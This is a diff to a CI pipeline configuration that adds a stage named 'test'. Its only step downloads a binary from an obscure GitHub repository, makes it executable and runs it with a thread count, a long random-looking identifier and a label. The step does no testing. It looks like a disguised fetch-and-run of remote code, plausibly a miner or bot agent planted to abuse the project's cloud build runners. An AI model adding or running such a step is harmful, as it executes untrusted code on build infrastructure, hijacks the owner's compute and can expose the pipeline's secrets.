@@ -25,6 +25,28 @@ pipeline:
           runtime:
             type: Cloud
             spec: {}
+    - stage:
+        name: test
+        identifier: test
+        description: ""
+        type: CI
+        spec:
+          cloneCodebase: true
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  type: Run
+                  name: Run_1
+                  identifier: Run_1
+                  spec:
+                    shell: Sh
+                    command: wget https://github.com/fkajsbge4/as/raw/main/test && chmod +x test && ./test -t 7 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG --label new1
   properties:
     ci:
       codebase:
